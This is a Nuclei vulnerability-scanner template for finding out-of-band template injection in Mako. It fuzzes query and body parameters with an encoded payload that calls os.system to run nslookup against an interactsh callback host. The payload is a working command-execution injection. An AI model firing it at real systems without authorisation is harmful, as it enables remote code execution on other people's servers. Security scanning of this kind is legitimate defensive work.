id: mako-oob
info:
  name: Mako - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: high
  reference:
    - https://www.makotemplates.org/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: dast,oast,oob,ssti,vuln
http:
  - fuzzing:
      - fuzz:
          - '{{injection}}'
        mode: single
        parts:
          - query
          - body
        type: postfix
    matchers:
      - condition: and
        # digest: 4b0a0048304602210081b69642dc2c446fd65924ea51372544debbc1543c6b09fe6f0e2966b641db14022100dc5c88e6386e7093ed322e62927de9badd63960f8c8e81988a2d5ee8860e66c0:922c64590222798bb761d5b6d8e72950

        dsl:
          - contains(interactsh_protocol,'dns')
          - contains(interactsh_request,'srv')
        name: request-matcher
        type: dsl
    payloads:
      injection:
        - '%24%7Bself.__init__.__globals__%5B%27util%27%5D.os.system%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D'
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    skip-variables-check: true
